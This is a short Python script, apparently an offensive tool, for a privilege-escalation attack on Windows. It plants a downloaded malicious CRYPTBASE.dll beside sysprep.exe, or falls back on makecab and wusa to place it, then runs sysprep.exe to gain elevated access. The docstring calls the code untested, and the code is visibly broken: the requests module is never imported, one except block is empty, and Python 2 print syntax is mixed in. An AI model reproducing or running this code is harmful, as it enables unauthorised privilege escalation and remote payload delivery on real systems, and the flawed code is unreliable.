"""
Under development, untested code but should work.
	
https://www.greyhathacker.net/?p=796
	
Executable:
C:\windows\System32\sysprep\sysprep.exe

Loads:
C:\Windows\System32\sysprep\CRYPTSP.dll
C:\windows\System32\sysprep\CRYPTBASE.dll
C:\Windows\System32\sysprep\RpcRtRemote.dll
C:\Windows\System32\sysprep\UxTheme.dll
	
Checks if sysprep.exe is present in \system32\sysprep\ folder, if True
continue by checking if the dll file exists. If false, continue by
attempting to download the evil dll file to \system32\sysprep\ folder
if fail, we attempt to use makecab and wusa to copy our dll. After
the copy is done, we execute the executable and enjoys the elevated
access
"""
import os
import sys
import win32api
import win32con

def sysprep_dll_hijack(url):
	if (os.path.isfile(os.path.join("c:\windows\system32\sysprep\sysprep.exe")) == True):
		if (os.path.isfile(os.path.join("c:\windows\system32\sysprep\CRYPTBASE.dll")) == False):
			try:
				download = requests.get(url)
				if (len(download.content) > 1):
					with open(os.path.join("c:\windows\system32\sysprep\CRYPTBASE.dll"),"wb") as dll:
						dll.write(download.content)
						dll.close()
					if (os.path.isfile(os.path.join("c:\windows\system32\sysprep\CRYPTBASE.dll")) == True):
						try:
							win32api.ShellExecute(0,None,"c:\windows\system32\sysprep\sysprep.exe",None,None,win32con.SW_SHOW)
						except Exception as error:
							return False
					else:
						try:
							makecab = os.popen("makecab CRYPTBASE.dll CRYPTBASE.tmp")
						except Exception as error:
							return False	
						try:
							wusa = os.popen("wusa CRYPTBASE.tmp /extract:c:\windows\system32\sysprep")
						except Exception as error:
							return False
						try:
							print os.remove("CRYPTBASE.tmp")
						except Exception as error:
							return False	
						try:
							win32api.ShellExecute(0,None,"c:\windows\system32\sysprep\sysprep.exe",None,None,win32con.SW_SHOW)
						except Exception as error:
							return False
				else:
					return False
			except Exception as error:

	else:
		sys.exit()		
